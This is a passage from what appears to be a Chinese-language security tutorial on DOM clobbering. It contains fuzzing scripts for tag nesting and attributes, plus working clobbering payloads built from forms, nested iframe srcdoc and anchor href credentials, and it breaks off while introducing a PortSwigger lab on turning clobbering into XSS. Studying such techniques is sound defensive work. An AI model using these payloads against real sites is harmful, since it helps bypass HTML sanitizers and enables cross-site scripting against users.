class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200225232907.png" alt></p><h3 id="HTML-Relationships"><a href="#HTML-Relationships" class="headerlink" title="HTML Relationships"></a>HTML Relationships</h3><p>&#x518D;&#x8005;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528; HTML &#x6807;&#x7B7E;&#x4E4B;&#x95F4;&#x5B58;&#x5728;&#x7684;&#x5173;&#x7CFB;&#x6765;&#x6784;&#x5EFA;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x3002;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> log=[];</span><br><span class="line"><span class="hljs-keyword">var</span> html = [<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;abbr&quot;</span>,<span class="hljs-string">&quot;acronym&quot;</span>,<span class="hljs-string">&quot;address&quot;</span>,<span class="hljs-string">&quot;applet&quot;</span>,<span class="hljs-string">&quot;area&quot;</span>,<span class="hljs-string">&quot;article&quot;</span>,<span class="hljs-string">&quot;aside&quot;</span>,<span class="hljs-string">&quot;audio&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;basefont&quot;</span>,<span class="hljs-string">&quot;bdi&quot;</span>,<span class="hljs-string">&quot;bdo&quot;</span>,<span class="hljs-string">&quot;bgsound&quot;</span>,<span class="hljs-string">&quot;big&quot;</span>,<span class="hljs-string">&quot;blink&quot;</span>,<span class="hljs-string">&quot;blockquote&quot;</span>,<span class="hljs-string">&quot;body&quot;</span>,<span class="hljs-string">&quot;br&quot;</span>,<span class="hljs-string">&quot;button&quot;</span>,<span class="hljs-string">&quot;canvas&quot;</span>,<span class="hljs-string">&quot;caption&quot;</span>,<span class="hljs-string">&quot;center&quot;</span>,<span class="hljs-string">&quot;cite&quot;</span>,<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-string">&quot;col&quot;</span>,<span class="hljs-string">&quot;colgroup&quot;</span>,<span class="hljs-string">&quot;command&quot;</span>,<span class="hljs-string">&quot;content&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;datalist&quot;</span>,<span class="hljs-string">&quot;dd&quot;</span>,<span class="hljs-string">&quot;del&quot;</span>,<span class="hljs-string">&quot;details&quot;</span>,<span class="hljs-string">&quot;dfn&quot;</span>,<span class="hljs-string">&quot;dialog&quot;</span>,<span class="hljs-string">&quot;dir&quot;</span>,<span class="hljs-string">&quot;div&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;dt&quot;</span>,<span class="hljs-string">&quot;element&quot;</span>,<span class="hljs-string">&quot;em&quot;</span>,<span class="hljs-string">&quot;embed&quot;</span>,<span class="hljs-string">&quot;fieldset&quot;</span>,<span class="hljs-string">&quot;figcaption&quot;</span>,<span class="hljs-string">&quot;figure&quot;</span>,<span class="hljs-string">&quot;font&quot;</span>,<span class="hljs-string">&quot;footer&quot;</span>,<span class="hljs-string">&quot;form&quot;</span>,<span class="hljs-string">&quot;frame&quot;</span>,<span class="hljs-string">&quot;frameset&quot;</span>,<span class="hljs-string">&quot;h1&quot;</span>,<span class="hljs-string">&quot;head&quot;</span>,<span class="hljs-string">&quot;header&quot;</span>,<span class="hljs-string">&quot;hgroup&quot;</span>,<span class="hljs-string">&quot;hr&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;iframe&quot;</span>,<span class="hljs-string">&quot;image&quot;</span>,<span class="hljs-string">&quot;img&quot;</span>,<span class="hljs-string">&quot;input&quot;</span>,<span class="hljs-string">&quot;ins&quot;</span>,<span class="hljs-string">&quot;isindex&quot;</span>,<span class="hljs-string">&quot;kbd&quot;</span>,<span class="hljs-string">&quot;keygen&quot;</span>,<span class="hljs-string">&quot;label&quot;</span>,<span class="hljs-string">&quot;legend&quot;</span>,<span class="hljs-string">&quot;li&quot;</span>,<span class="hljs-string">&quot;link&quot;</span>,<span class="hljs-string">&quot;listing&quot;</span>,<span class="hljs-string">&quot;main&quot;</span>,<span class="hljs-string">&quot;map&quot;</span>,<span class="hljs-string">&quot;mark&quot;</span>,<span class="hljs-string">&quot;marquee&quot;</span>,<span class="hljs-string">&quot;menu&quot;</span>,<span class="hljs-string">&quot;menuitem&quot;</span>,<span class="hljs-string">&quot;meta&quot;</span>,<span class="hljs-string">&quot;meter&quot;</span>,<span class="hljs-string">&quot;multicol&quot;</span>,<span class="hljs-string">&quot;nav&quot;</span>,<span class="hljs-string">&quot;nextid&quot;</span>,<span class="hljs-string">&quot;nobr&quot;</span>,<span class="hljs-string">&quot;noembed&quot;</span>,<span class="hljs-string">&quot;noframes&quot;</span>,<span class="hljs-string">&quot;noscript&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-string">&quot;ol&quot;</span>,<span class="hljs-string">&quot;optgroup&quot;</span>,<span class="hljs-string">&quot;option&quot;</span>,<span class="hljs-string">&quot;output&quot;</span>,<span class="hljs-string">&quot;p&quot;</span>,<span class="hljs-string">&quot;param&quot;</span>,<span class="hljs-string">&quot;picture&quot;</span>,<span class="hljs-string">&quot;plaintext&quot;</span>,<span class="hljs-string">&quot;pre&quot;</span>,<span class="hljs-string">&quot;progress&quot;</span>,<span class="hljs-string">&quot;q&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>,<span class="hljs-string">&quot;rp&quot;</span>,<span class="hljs-string">&quot;rt&quot;</span>,<span class="hljs-string">&quot;rtc&quot;</span>,<span class="hljs-string">&quot;ruby&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;samp&quot;</span>,<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;section&quot;</span>,<span class="hljs-string">&quot;select&quot;</span>,<span class="hljs-string">&quot;shadow&quot;</span>,<span class="hljs-string">&quot;slot&quot;</span>,<span class="hljs-string">&quot;small&quot;</span>,<span class="hljs-string">&quot;source&quot;</span>,<span class="hljs-string">&quot;spacer&quot;</span>,<span class="hljs-string">&quot;span&quot;</span>,<span class="hljs-string">&quot;strike&quot;</span>,<span class="hljs-string">&quot;strong&quot;</span>,<span class="hljs-string">&quot;style&quot;</span>,<span class="hljs-string">&quot;sub&quot;</span>,<span class="hljs-string">&quot;summary&quot;</span>,<span class="hljs-string">&quot;sup&quot;</span>,<span class="hljs-string">&quot;svg&quot;</span>,<span class="hljs-string">&quot;table&quot;</span>,<span class="hljs-string">&quot;tbody&quot;</span>,<span class="hljs-string">&quot;td&quot;</span>,<span class="hljs-string">&quot;template&quot;</span>,<span class="hljs-string">&quot;textarea&quot;</span>,<span class="hljs-string">&quot;tfoot&quot;</span>,<span class="hljs-string">&quot;th&quot;</span>,<span class="hljs-string">&quot;thead&quot;</span>,<span class="hljs-string">&quot;time&quot;</span>,<span class="hljs-string">&quot;title&quot;</span>,<span class="hljs-string">&quot;tr&quot;</span>,<span class="hljs-string">&quot;track&quot;</span>,<span class="hljs-string">&quot;tt&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-string">&quot;ul&quot;</span>,<span class="hljs-string">&quot;var&quot;</span>,<span class="hljs-string">&quot;video&quot;</span>,<span class="hljs-string">&quot;wbr&quot;</span>,<span class="hljs-string">&quot;xmp&quot;</span>], logs = [];</span><br><span class="line">div=<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&apos;div&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;html.length;i++) {</span><br><span class="line">  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> j=<span class="hljs-number">0</span>;j&lt;html.length;j++) {</span><br><span class="line">    div.innerHTML=<span class="hljs-string">&apos;&lt;&apos;</span>+html[i]+<span class="hljs-string">&apos; id=element1&gt;&apos;</span>+<span class="hljs-string">&apos;&lt;&apos;</span>+html[j]+<span class="hljs-string">&apos; id=element2&gt;&apos;</span>;</span><br><span class="line">    <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">window</span>.element1 &amp;&amp; element1.element2){</span><br><span class="line">       log.push(html[i]+<span class="hljs-string">&apos;,&apos;</span>+html[j]);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log.join(<span class="hljs-string">&apos;\n&apos;</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE5;&#x4E0A;&#x4EE3;&#x7801;&#x6D4B;&#x8BD5;&#x4E86;&#x73B0;&#x5728; HTML5 &#x57FA;&#x672C;&#x4E0A;&#x6240;&#x6709;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x4F7F;&#x7528;&#x4E24;&#x5C42;&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x8FDB;&#x884C; fuzz &#xFF0C;&#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x53EA;&#x4F7F;&#x7528;&#x4E86;<code>id</code>&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x4F7F;&#x7528;<code>name</code>&#xFF0C;&#x9047;&#x4E0A;&#x6587;&#x7684;<code>HTMLCollection</code>&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7684;&#x662F;&#x4EE5;&#x4E0B;&#x5173;&#x7CFB;&#xFF1A;</p><p></p><figure class="highlight xl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>button</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>fieldset</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>image</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>img</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>input</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>object</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>output</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>select</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>textarea</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x6784;&#x5EFA;<code>x.y</code>&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x6784;&#x5EFA;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">y</span>&gt;</span>I&apos;ve been clobbered<span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">alert(x.y.value);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Three-Level"><a href="#Three-Level" class="headerlink" title="Three Level"></a>Three Level</h3><p>&#x4E09;&#x7EA7;&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x7528;&#x5230;&#x4EE5;&#x4E0A;&#x4E24;&#x79CD;&#x6280;&#x5DE7;&#x6765;&#x6784;&#x5EFA;&#x4E86;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;y&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">z</span>&gt;</span>I&apos;ve been clobbered<span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">  alert(x.y.z.value);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5148;&#x7528;&#x4E00;&#x4E2A;<code>HTMLCollection</code>&#x83B7;&#x53D6;&#x7B2C;&#x4E8C;&#x7EA7;&#xFF0C;&#x518D;&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#x8868;&#x5355;&#x4E2D;&#x7528;<code>output</code>&#x6807;&#x7B7E;&#x5373;&#x53EF;&#x3002;</p><h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p>&#x4E09;&#x5C42;&#x5C42;&#x7EA7;&#x4EE5;&#x4E0A;&#x7684;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x7528;&#x5230;<code>iframe</code>&#x4E0E;<code>srcdoc</code>&#x6765;&#x8FDB;&#x884C;&#x914D;&#x5408;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">a</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-string">&lt;iframe srcdoc=&apos;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&apos; name=b&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-javascript">setTimeout(<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>alert(a.b.c.d),<span class="hljs-number">500</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x7B49;&#x5F85;&#x6240;&#x6709;&#x7684;<code>iframe</code>&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#x6211;&#x4EEC;&#x624D;&#x80FD;&#x83B7;&#x5F97;&#x8FD9;&#x4E2A;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x7528;&#x5230;&#x5EF6;&#x65F6;&#xFF0C;&#x4E0D;&#x7528;&#x5EF6;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x8BF7;&#x6C42;&#x6765;&#x8FDB;&#x884C;&#x5EF6;&#x7F13;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">a</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-string">&lt;iframe srcdoc=&apos;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&apos; name=b&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-css"><span class="hljs-keyword">@import</span> <span class="hljs-string">&apos;http://example.com&apos;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">alert(a.b.c.d)</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Custom"><a href="#Custom" class="headerlink" title="Custom"></a>Custom</h3><p>&#x4EE5;&#x4E0A;&#x6211;&#x4EEC;&#x90FD;&#x662F;&#x901A;&#x8FC7; id &#x6216;&#x8005; name &#x6765;&#x5229;&#x7528;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x80FD;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x81EA;&#x5B9A;&#x4E49;&#x5C5E;&#x6027;&#x6765;&#x6784;&#x9020;&#x5462;&#xFF1F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">y</span>=<span class="hljs-string">123</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">alert(x.y)<span class="hljs-comment">//undefined</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x4EFB;&#x4F55;&#x672A;&#x5B9A;&#x4E49;&#x7684;&#x5C5E;&#x6027;&#x90FD;&#x4E0D;&#x4F1A;&#x5177;&#x6709; DOM &#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x8FD4;&#x56DE;&#x4E86; <code>undefined</code></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B; fuzz &#x6240;&#x6709;&#x6807;&#x7B7E;&#x7684;&#x6709;&#x6CA1;&#x6709;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x5C5E;&#x6027;&#x53EF;&#x4F9B;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...]<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> props=[];</span><br><span class="line"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;html.length;i++){</span><br><span class="line">  obj = <span class="hljs-built_in">document</span>.createElement(html[i]);</span><br><span class="line">   <span class="hljs-keyword">for</span>(prop <span class="hljs-keyword">in</span> obj) {</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">&apos;string&apos;</span>) {</span><br><span class="line">      <span class="hljs-keyword">try</span> {</span><br><span class="line">        props.push(html[i]+<span class="hljs-string">&apos;:&apos;</span>+prop);</span><br><span class="line">      }<span class="hljs-keyword">catch</span>(e){}</span><br><span class="line">    }</span><br><span class="line">   }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log([...new <span class="hljs-built_in">Set</span>(props)].join(<span class="hljs-string">&apos;\n&apos;</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x7CFB;&#x5217;&#x6807;&#x7B7E;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x4F8B;&#x5982;:</p><p></p><figure class="highlight avrasm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">a:</span>username</span><br><span class="line"><span class="hljs-symbol">a:</span>password</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F46;&#x662F;&#x8FD9;&#x4EC5;&#x4EC5;&#x5F97;&#x5230;&#x7684;&#x53EA;&#x662F;&#x77E5;&#x9053;&#x5B83;&#x4EEC;&#x5C5E;&#x6027;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053;&#x80FD;&#x4E0D;&#x80FD;&#x5229;&#x7528;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x52A0;&#x4E0A;&#x4E00;&#x4E9B;&#x4E1C;&#x897F;&#x6765;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...]<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> props=[];</span><br><span class="line"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;html.length;i++){</span><br><span class="line">  obj = <span class="hljs-built_in">document</span>.createElement(html[i]);</span><br><span class="line">  <span class="hljs-keyword">for</span>(prop <span class="hljs-keyword">in</span> obj) {</span><br><span class="line">  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">&apos;string&apos;</span>) {</span><br><span class="line">   <span class="hljs-keyword">try</span> {</span><br><span class="line">    DOM.innerHTML = <span class="hljs-string">&apos;&lt;&apos;</span>+html[i]+<span class="hljs-string">&apos; id=x &apos;</span>+prop+<span class="hljs-string">&apos;=1&gt;&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>)[prop] == <span class="hljs-number">1</span>) {</span><br><span class="line">       props.push(html[i]+<span class="hljs-string">&apos;:&apos;</span>+prop);</span><br><span class="line">    }</span><br><span class="line">    }<span class="hljs-keyword">catch</span>(e){}</span><br><span class="line">  }</span><br><span class="line"> }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log([...new <span class="hljs-built_in">Set</span>(props)].join(<span class="hljs-string">&apos;\n&apos;</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x6807;&#x7B7E;&#x4EE5;&#x53CA;&#x5176;&#x5C5E;&#x6027;&#x540D;&#x79F0;&#xFF0C;&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5176;&#x4E2D;&#x7684;<code>a:title</code>&#x6765;&#x8FDB;&#x884C;&#x7EC4;&#x5408;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&apos;hasaki&apos;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(x.title);<span class="hljs-comment">//hasaki</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4E2D;&#x5728;&#x6211;&#x4EEC;&#x7B2C;&#x4E00;&#x6B65;&#x5F97;&#x5230;&#x7684;&#x5C5E;&#x6027;&#x4E2D;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x662F; a &#x6807;&#x7B7E;&#x7684;<code>username</code>&#x8DDF;<code>password</code>&#x5C5E;&#x6027;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x901A;&#x8FC7;<code>title</code>&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x5229;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>href</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x5229;&#x7528;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;ftp:Clobbered-username:Clobbered-Password@a&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">alert(x.username)<span class="hljs-comment">//Clobbered-username</span></span></span><br><span class="line"><span class="hljs-actionscript">alert(x.password)<span class="hljs-comment">//Clobbered-password</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Exploit-Example"><a href="#Exploit-Example" class="headerlink" title="Exploit Example"></a>Exploit Example</h2><p>PostWigger &#x63D0;&#x4F9B;&#x4E86;&#x4E24;&#x4E2A;&#x5B9E;&#x9A8C;&#x73AF;&#x5883; <a href="https://portswigger.net/web-security/dom-based/dom-clobbering&#xFF0C;" target="_blank" rel="noopener">https://portswigger.net/web-security/dom-based/dom-clobbering&#xFF0C;</a></p><h3 id="Lab-Exploiting-DOM-clobbering-to-enable-XSS"><a href="#Lab-Exploiting-DOM-clobbering-to-enable-XSS" class="headerlink" title="Lab: Exploiting DOM clobbering to enable XSS"></a>Lab: Exploiting DOM clobbering to enable XSS</h3><blockquote><p>&#x200B;    This lab contains a DOM-clobbering vulnerability. The comment functionality allows &#x201C;safe&#x201D; HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">XSS</a> to call the alert() 